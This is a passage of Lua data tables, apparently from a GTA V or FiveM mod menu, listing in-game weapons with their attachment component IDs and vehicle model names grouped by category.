= '~s~~s~Fat-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_03' }, { name = '~s~~s~Precision Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_04' }, { name = '~s~~s~Heavy Duty Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_05' }, { name = '~s~~s~Slanted Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_06' }, { name = '~s~~s~Split-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_07' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02' } } } }, AdvancedRifle = { id = 'weapon_advancedrifle', name = '~s~~s~Advanced Rifle ', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_ADVANCEDRIFLE_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_ADVANCEDRIFLE_CLIP_02' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_SMALL' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' } } } }, SpecialCarbine = { id = 'weapon_specialcarbine', name = '~s~~s~Special Carbine', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_SPECIALCARBINE_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_SPECIALCARBINE_CLIP_02' }, { name = '~s~~s~Drum Magazine', id = 'COMPONENT_SPECIALCARBINE_CLIP_03' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, SpecialCarbineMkII = { id = 'weapon_specialcarbine_mk2', name = '~s~~s~Special Carbine Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Small Scope', id = 'COMPONENT_AT_SCOPE_MACRO_MK2' }, { name = '~s~~s~Large Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_SC_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_SC_BARREL_02' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' }, { name = '~s~~s~Flat Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_01' }, { name = '~s~~s~Tactical Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_02' }, { name = '~s~~s~Fat-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_03' }, { name = '~s~~s~Precision Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_04' }, { name = '~s~~s~Heavy Duty Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_05' }, { name = '~s~~s~Slanted Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_06' }, { name = '~s~~s~Split-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_07' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02' } } } }, BullpupRifle = { id = 'weapon_bullpuprifle', name = '~s~~s~Bullpup Rifle', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_BULLPUPRIFLE_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_BULLPUPRIFLE_CLIP_02' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_SMALL' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, BullpupRifleMkII = { id = 'weapon_bullpuprifle_mk2', name = '~s~~s~Bullpup Rifle Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Armor Piercing Rounds', id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Small Scope', id = 'COMPONENT_AT_SCOPE_MACRO_02_MK2' }, { name = '~s~~s~Medium Scope', id = 'COMPONENT_AT_SCOPE_SMALL_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_BP_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_BP_BARREL_02' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' }, { name = '~s~~s~Flat Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_01' }, { name = '~s~~s~Tactical Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_02' }, { name = '~s~~s~Fat-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_03' }, { name = '~s~~s~Precision Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_04' }, { name = '~s~~s~Heavy Duty Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_05' }, { name = '~s~~s~Slanted Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_06' }, { name = '~s~~s~Split-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_07' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, CompactRifle = { id = 'weapon_compactrifle', name = '~s~~s~Compact Rifle', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_COMPACTRIFLE_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_COMPACTRIFLE_CLIP_02' }, { name = '~s~~s~Drum Magazine', id = 'COMPONENT_COMPACTRIFLE_CLIP_03' } } } } }, LMG = { MG = { id = 'weapon_mg', name = '~s~~s~MG', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_MG_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_MG_CLIP_02' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_SMALL_02' } } } }, CombatMG = { id = 'weapon_combatmg', name = '~s~~s~Combat MG', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_COMBATMG_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_COMBATMG_CLIP_02' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, CombatMGMkII = { id = 'weapon_combatmg_mk2', name = '~s~~s~Combat MG Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_COMBATMG_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_COMBATMG_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_COMBATMG_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_COMBATMG_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Medium Scope', id = 'COMPONENT_AT_SCOPE_SMALL_MK2' }, { name = '~s~~s~Large Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_MG_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_MG_BARREL_02' } }, BarrelAttachments = { { name = '~s~~s~Flat Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_01' }, { name = '~s~~s~Tactical Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_02' }, { name = '~s~~s~Fat-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_03' }, { name = '~s~~s~Precision Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_04' }, { name = '~s~~s~Heavy Duty Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_05' }, { name = '~s~~s~Slanted Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_06' }, { name = '~s~~s~Split-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_07' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02' } } } }, GusenbergSweeper = { id = 'weapon_gusenberg', name = '~s~~s~GusenbergSweeper', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_GUSENBERG_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_GUSENBERG_CLIP_02' } } } } }, Snipers = { SniperRifle = { id = 'weapon_sniperrifle', name = '~s~~s~Sniper Rifle', bInfAmmo = false, mods = { Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_LARGE' }, { name = '~s~~s~Advanced Scope', id = 'COMPONENT_AT_SCOPE_MAX' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' } } } }, HeavySniper = { id = 'weapon_heavysniper', name = '~s~~s~Heavy Sniper', bInfAmmo = false, mods = { Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_LARGE' }, { name = '~s~~s~Advanced Scope', id = 'COMPONENT_AT_SCOPE_MAX' } } } }, HeavySniperMkII = { id = 'weapon_heavysniper_mk2', name = '~s~~s~Heavy Sniper Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_02' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Armor Piercing Rounds', id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ' }, { name = '~s~~s~Explosive Rounds', id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE' } }, Sights = { { name = '~s~~s~Zoom Scope', id = 'COMPONENT_AT_SCOPE_LARGE_MK2' }, { name = '~s~~s~Advanced Scope', id = 'COMPONENT_AT_SCOPE_MAX' }, { name = '~s~~s~Nigt Vision Scope', id = 'COMPONENT_AT_SCOPE_NV' }, { name = '~s~~s~Thermal Scope', id = 'COMPONENT_AT_SCOPE_THERMAL' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_SR_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_SR_BARREL_02' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_SR_SUPP_03' }, { name = '~s~~s~Squared Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_08' }, { name = '~s~~s~Bell-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_09' } } } }, MarksmanRifle = { id = 'weapon_marksmanrifle', name = '~s~~s~Marksman Rifle', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_MARKSMANRIFLE_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_MARKSMANRIFLE_CLIP_02' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, MarksmanRifleMkII = { id = 'weapon_marksmanrifle_mk2', name = '~s~~s~Marksman Rifle Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Large Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2' }, { name = '~s~~s~Zoom Scope', id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_MRFL_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_MRFL_BARREL_02' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' }, { name = '~s~~s~Flat Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_01' }, { name = '~s~~s~Tactical Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_02' }, { name = '~s~~s~Fat-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_03' }, { name = '~s~~s~Precision Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_04' }, { name = '~s~~s~Heavy Duty Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_05' }, { name = '~s~~s~Slanted Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_06' }, { name = '~s~~s~Split-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_07' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02' } } } } }, Heavy = { RPG = { id = 'weapon_rpg', name = '~s~~s~RPG', bInfAmmo = false, mods = {} }, GrenadeLauncher = { id = 'weapon_grenadelauncher', name = '~s~~s~Grenade Launcher', bInfAmmo = false, mods = {} }, GrenadeLauncherSmoke = { id = 'weapon_grenadelauncher_smoke', name = '~s~~s~Grenade Launcher Smoke', bInfAmmo = false, mods = {} }, Minigun = { id = 'weapon_minigun', name = '~s~~s~Minigun', bInfAmmo = false, mods = {} }, FireworkLauncher = { id = 'weapon_firework', name = '~s~~s~Firework Launcher', bInfAmmo = false, mods = {} }, Railgun = { id = 'weapon_railgun', name = '~s~~s~Railgun', bInfAmmo = false, mods = {} }, HomingLauncher = { id = 'weapon_hominglauncher', name = '~s~~s~Homing Launcher', bInfAmmo = false, mods = {} }, CompactGrenadeLauncher = { id = 'weapon_compactlauncher', name = '~s~~s~Compact Grenade Launcher', bInfAmmo = false, mods = {} }, Widowmaker = { id = 'weapon_rayminigun', name = '~s~~s~Widowmaker', bInfAmmo = false, mods = {} } }, Throwables = { Grenade = { id = 'weapon_grenade', name = '~s~~s~Grenade', bInfAmmo = false, mods = {} }, BZGas = { id = 'weapon_bzgas', name = '~s~~s~BZ Gas', bInfAmmo = false, mods = {} }, MolotovCocktail = { id = 'weapon_molotov', name = '~s~~s~Molotov Cocktail', bInfAmmo = false, mods = {} }, StickyBomb = { id = 'weapon_stickybomb', name = '~s~~s~Sticky Bomb', bInfAmmo = false, mods = {} }, ProximityMines = { id = 'weapon_proxmine', name = '~s~~s~Proximity Mines', bInfAmmo = false, mods = {} }, Snowballs = { id = 'weapon_snowball', name = '~s~~s~Snowballs', bInfAmmo = false, mods = {} }, PipeBombs = { id = 'weapon_pipebomb', name = '~s~~s~Pipe Bombs', bInfAmmo = false, mods = {} }, Baseball = { id = 'weapon_ball', name = '~s~~s~Baseball', bInfAmmo = false, mods = {} }, TearGas = { id = 'weapon_smokegrenade', name = '~s~~s~Tear Gas', bInfAmmo = false, mods = {} }, Flare = { id = 'weapon_flare', name = '~s~~s~Flare', bInfAmmo = false, mods = {} } }, Misc = { Parachute = { id = 'gadget_parachute', name = '~s~~s~Parachute', bInfAmmo = false, mods = {} }, FireExtinguisher = { id = 'weapon_fireextinguisher', name = '~s~~s~Fire Extinguisher', bInfAmmo = false, mods = {} } } }
local weaponsArrayeet = { --[[Melee]] "WEAPON_KNIFE", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE", "WEAPON_POOLCUE", "WEAPON_PIPEWRENCH", --[[Pistols]] "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_REVOLVER", "WEAPON_REVOLVER_MK2", "WEAPON_DOUBLEACTION", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_SNSPISTOL_MK2", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", --[[ SMGs / MGs]] "WEAPON_MICROSMG", "WEAPON_MINISMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG", "WEAPON_MACHINEPISTOL", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", --[[ Assault Rifles]] "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_SPECIALCARBINE_MK2", "WEAPON_BULLPUPRIFLE", "WEAPON_BULLPUPRIFLE_MK2", "WEAPON_COMPACTRIFLE", --[[Shotguns]] "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SWEEPERSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", --[[Sniper Rifles]] "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2", --[[Heavy Weapons]] "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_MINIGUN", "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_COMPACTLAUNCHER", --[[Thrown]] "WEAPON_GRENADE", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE", "WEAPON_BZGAS", "WEAPON_SMOKEGRENADE", "WEAPON_MOLOTOV", "WEAPON_FIREEXTINGUISHER", "WEAPON_PETROLCAN", "WEAPON_SNOWBALL", "WEAPON_FLARE", "WEAPON_BALL", }
local vehicleCategories = { 'Boats', 'Commercial', 'Compacts', 'Coupes', 'Cycles', 'Emergency', 'Helictopers', 'Industrial', 'Military', 'Motorcycles', 'Muscle', 'Off-Road', 'Planes', 'SUVs', 'Sedans', 'Service', 'Sports', 'Sports Classic', 'Super', 'Trailer', 'Trains', 'Utility', 'Vans' }
local vehicleSboatsList = { 'Dinghy', 'Dinghy2', 'Dinghy3', 'Dingh4', 'Jetmax', 'Marquis', 'Seashark', 'Seashark2', 'Seashark3', 'Speeder', 'Speeder2', 'Squalo', 'Submersible', 'Submersible2', 'Suntrap', 'Toro', 'Toro2', 'Tropic', 'Tropic2', 'Tug' }
local vehicleStrucksList = { 'Benson', 'Biff', 'Cerberus', 'Cerberus2', 'Cerberus3', 'Hauler', 'Hauler2', 'Mule', 'Mule2', 'Mule3', 'Mule4', 'Packer', 'Phantom', 'Phantom2', 'Phantom3', 'Pounder', 'Pounder2', 'Stockade', 'Stockade3', 'Terbyte' }
local vehicleScompactsList = { 'Blista', 'Blista2', 'Blista3', 'Brioso', 'Dilettante', 'Dilettante2', 'Issi2', 'Issi3', 'issi4', 'Iss5', 'issi6', 'Panto', 'Prarire', 'Rhapsody' }
local vehicleScoupesList = { 'CogCabrio', 'Exemplar', 'F620', 'Felon', 'Felon2', 'Jackal', 'Oracle', 'Oracle2', 'Sentinel', 'Sentinel2', 'Windsor', 'Windsor2', 'Zion', 'Zion2' }
local vehicleSbicyclesList = { 'Bmx', 'Cruiser', 'Fixter', 'Scorcher', 'Tribike', 'Tribike2', 'tribike3' }
local vehicleSemergencyList = { 'ambulance', 'FBI', 'FBI2', 'FireTruk', 'PBus', 'police', 'Police2', 'Police3', 'Police4', 'PoliceOld1', 'PoliceOld2', 'PoliceT', 'Policeb', 'Polmav', 'Pranger', 'Predator', 'Riot', 'Riot2', 'Sheriff', 'Sheriff2' }
local vehicleShelicoptersList = { 'Akula', 'Annihilator', 'Buzzard', 'Buzzard2', 'Cargobob', 'Cargobob2', 'Cargobob3', 'Cargobob4', 'Frogger', 'Frogger2', 'Havok', 'Hunter', 'Maverick', 'Savage', 'Seasparrow', 'Skylift', 'Supervolito', 'Supervolito2', 'Swift', 'Swift2', 'Valkyrie', 'Valkyrie2', 'Volatus' }
local vehicleSindustrialList = { 'Bulldozer', 'Cutter', 'Dump', 'Flatbed', 'Guardian', 'Handler', 'Mixer', 'Mixer2', 'Rubble', 'Tiptruck', 'Tiptruck2' }
local vehicleSmilitaryVehicles = { 'APC', 'Barracks', 'Barracks2', 'Barracks3', 'Barrage', 'Chernobog', 'Crusader', 'Halftrack', 'Khanjali', 'Rhino', 'Scarab', 'Scarab2', 'Scarab3', 'Thruster', 'Trailersmall2' }
local vehicleSmotorcyclesList = { 'Akuma', 'Avarus', 'Bagger', 'Bati2', 'Bati', 'BF400', 'Blazer4', 'CarbonRS', 'Chimera', 'Cliffhanger', 'Daemon', 'Daemon2', 'Defiler', 'Deathbike', 'Deathbike2', 'Deathbike3', 'Diablous', 'Diablous2', 'Double', 'Enduro', 'esskey', 'Faggio2', 'Faggio3', 'Faggio', 'Fcr2', 'fcr', 'gargoyle', 'hakuchou2', 'hakuchou', 'hexer', 'innovation', 'Lectro', 'Manchez', 'Nemesis', 'Nightblade', 'Oppressor', 'Oppressor2', 'PCJ', 'Ratbike', 'Ruffian', 'Sanchez2', 'Sanchez', 'Sanctus', 'Shotaro', 'Sovereign', 'Thrust', 'Vader', 'Vindicator', 'Vortex', 'Wolfsbane', 'zombiea', 'zombieb' }
local vehicleSmuscleList = { 'Blade', 'Buccaneer', 'Buccaneer2', 'Chino', 'Chino2', 'clique', 'Deviant', 'Dominator', 'Dominator2', 'Dominator3', 'Dominator4', 'Dominator5', 'Dominator6', 'Dukes', 'Dukes2', 'Ellie', 'Faction', 'faction2', 'faction3', 'Gauntlet', 'Gauntlet2', 'Hermes', 'Hotknife', 'Hustler', 'Impaler', 'Impaler2', 'Impaler3', 'Impaler4', 'Imperator', 'Imperator2', 'Imperator3', 'Lurcher', 'Moonbeam', 'Moonbeam2', 'Nightshade', 'Phoenix', 'Picador', 'RatLoader', 'RatLoader2', 'Ruiner', 'Ruiner2', 'Ruiner3', 'SabreGT', 'SabreGT2', 'Sadler2', 'Slamvan', 'Slamvan2', 'Slamvan3', 'Slamvan4', 'Slamvan5', 'Slamvan6', 'Stalion', 'Stalion2', 'Tampa', 'Tampa3', 'Tulip', 'Vamos,', 'Vigero', 'Virgo', 'Virgo2', 'Virgo3', 'Voodoo', 'Voodoo2', 'Yosemite' }
local vehicleSoffroadList = { 'BFinjection', 'Bifta', 'Blazer', 'Blazer2', 'Blazer3', 'Blazer5', 'Bohdi', 'Brawler', 'Bruiser', 'Bruiser2', 'Bruiser3', 'Caracara', 'DLoader', 'Dune', 'Dune2', 'Dune3', 'Dune4', 'Dune5', 'Insurgent', 'Insurgent2', 'Insurgent3', 'Kalahari', 'Kamacho', 'LGuard', 'Marshall', 'Mesa', 'Mesa2', 'Mesa3', 'Monster', 'Monster4', 'Monster5', 'Nightshark', 'RancherXL', 'RancherXL2', 'Rebel', 'Rebel2', 'RCBandito', 'Riata', 'Sandking', 'Sandking2', 'Technical', 'Technical2', 'Technical3', 'TrophyTruck', 'TrophyTruck2', 'Freecrawler', 'Menacer' }
local vehicleSplanesList = { 'AlphaZ1', 'Avenger', 'Avenger2', 'Besra', 'Blimp', 'blimp2', 'Blimp3', 'Bombushka', 'Cargoplane', 'Cuban800', 'Dodo', 'Duster', 'Howard', 'Hydra', 'Jet', 'Lazer', 'Luxor', 'Luxor2', 'Mammatus', 'Microlight', 'Miljet', 'Mogul', 'Molotok', 'Nimbus', 'Nokota', 'Pyro', 'Rogue', 'Seabreeze', 'Shamal', 'Starling', 'Stunt', 'Titan', 'Tula', 'Velum', 'Velum2', 'Vestra', 'Volatol', 'Striekforce' }
local vehicleSsuvsList = { 'BJXL', 'Baller', 'Baller2', 'Baller3', 'Baller4', 'Baller5', 'Baller6', 'Cavalcade', 'Cavalcade2', 'Dubsta', 'Dubsta2', 'Dubsta3', 'FQ2', 'Granger', 'Gresley', 'Habanero', 'Huntley', 'Landstalker', 'patriot', 'Patriot2', 'Radi', 'Rocoto', 'Seminole', 'Serrano', 'Toros', 'XLS', 'XLS2' }
local vehicleSsedansList = { 'Asea', 'Asea2', 'Asterope', 'Cog55', 'Cogg552', 'Cognoscenti', 'Cognoscenti2', 'emperor', 'emperor2', 'emperor3', 'Fugitive', 'Glendale', 'ingot', 'intruder', 'limo2', 'premier', 'primo', 'primo2', 'regina', 'romero', 'stafford', 'Stanier', 'stratum', 'stretch', 'surge', 'tailgater', 'warrener', 'Washington' }
local vehicleSserviceList = { 'Airbus', 'Brickade', 'Bus', 'Coach', 'Rallytruck', 'Rentalbus', 'taxi', 'Tourbus', 'Trash', 'Trash2', 'WastIndr', 'PBus2' }
local vehicleSsportsList = { 'Alpha', 'Banshee', 'Banshee2', 'BestiaGTS', 'Buffalo', 'Buffalo2', 'Buffalo3', 'Carbonizzare', 'Comet2', 'Comet3', 'Comet4', 'Comet5', 'Coquette', 'Deveste', 'Elegy2', 'Feltzer2', 'Feltzer3', 'FlashGT', 'Furoregt', 'Fusilade', 'Futo', 'GB200', 'Hotring', 'Infernus2', 'Italigto', 'Jester', 'Jester2', 'Khamelion', 'Kurama', 'Kurama2', 'Lynx', 'MAssacro', 'MAssacro2', 'neon', 'Ninef', 'ninfe2', 'omnis', 'Pariah', 'Penumbra', 'Raiden', 'RapidGT', 'RapidGT2', 'Raptor', 'Revolter', 'Ruston', 'Schafter2', 'Schafter3', 'Schafter4', 'Schafter5', 'Schafter6', 'Schlagen', 'Schwarzer', 'Sentinel3', 'Seven70', 'Specter', 'Specter2', 'Streiter', 'Sultan', 'Surano', 'Tampa2', 'Tropos', 'Verlierer2', 'ZR380' }
